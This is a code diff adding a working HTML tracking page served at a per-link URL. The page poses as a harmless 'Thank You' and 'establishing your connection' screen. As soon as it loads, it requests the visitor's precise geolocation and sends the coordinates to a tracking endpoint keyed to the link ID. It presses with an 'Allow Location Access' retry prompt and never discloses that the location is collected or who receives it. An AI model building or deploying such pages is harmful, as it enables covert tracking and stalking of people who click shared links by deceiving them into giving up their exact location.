@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Thank You For Visiting</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <style>
+        body {
+            background-color: #f8f9fa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .card {
+            max-width: 500px;
+            width: 100%;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            border: none;
+            border-radius: 10px;
+        }
+
+        .loader {
+            width: 40px;
+            height: 40px;
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #007bff;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <div class="card">
+            <div class="card-body text-center">
+                <div id="loading">
+                    <div class="loader mb-3"></div>
+                    <h4>Loading, please wait...</h4>
+                    <p class="text-muted">We are establishing your connection.</p>
+                </div>
+
+                <div id="content" class="d-none">
+                    <div class="mb-4">
+                        <img src="https://cdn.pixabay.com/photo/2016/03/31/14/37/check-mark-1292787_1280.png"
+                            alt="Success" style="max-width: 100px;">
+                    </div>
+                    <h2>Thank You!</h2>
+                    <p class="lead">Your connection has been established successfully.</p>
+                    <p>You can close this page now.</p>
+                </div>
+
+                <div id="error" class="d-none">
+                    <div class="mb-4 text-danger">
+                        <i class="bi bi-exclamation-triangle" style="font-size: 48px;"></i>
+                    </div>
+                    <h2>Location Access Required</h2>
+                    <p>This page needs location access to continue.</p>
+                    <button id="retryBtn" class="btn btn-primary mt-3">Allow Location Access</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function () {
+            const urlPath = window.location.pathname;
+            const linkId = urlPath.split('/t/')[1];
+
+            if (!linkId) {
+                window.location.href = '/';
+                return;
+            }
+
+            const loadingEl = document.getElementById('loading');
+            const contentEl = document.getElementById('content');
+            const errorEl = document.getElementById('error');
+            const retryBtn = document.getElementById('retryBtn');
+
+            retryBtn.addEventListener('click', requestLocation);
+
+            function requestLocation() {
+                loadingEl.classList.remove('d-none');
+                contentEl.classList.add('d-none');
+                errorEl.classList.add('d-none');
+
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        function (position) {
+                            // Success callback
+                            const locationData = {
+                                latitude: position.coords.latitude,
+                                longitude: position.coords.longitude
+                            };
+
+                            // Send location data to the server
+                            fetch(`/api/track/${linkId}`, {
+                                method: 'POST',
+                                headers: {
+                                    'Content-Type': 'application/json'
+                                },
+                                body: JSON.stringify(locationData)
+                            })
+                                .then(response => response.json())
+                                .then(data => {
+                                    loadingEl.classList.add('d-none');
+                                    contentEl.classList.remove('d-none');
+                                })
+                                .catch(error => {
+                                    console.error('Error:', error);
+                                    loadingEl.classList.add('d-none');
+                                    errorEl.classList.remove('d-none');
+                                });
+                        },
+                        function (error) {
+                            // Error callback
+                            console.error('Geolocation error:', error);
+                            loadingEl.classList.add('d-none');
+                            errorEl.classList.remove('d-none');
+                        },
+                        {
+                            enableHighAccuracy: true,
+                            timeout: 5000,
+                            maximumAge: 0
+                        }
+                    );
+                } else {
+                    // Geolocation not supported
+                    loadingEl.classList.add('d-none');
+                    errorEl.classList.remove('d-none');
+                    errorEl.querySelector('p').innerText = 'Geolocation is not supported by this browser.';
+                }
+            }
+
+            // Request location when page loads
+            requestLocation();
+        });
+    </script>
+</body>
+
+</html>
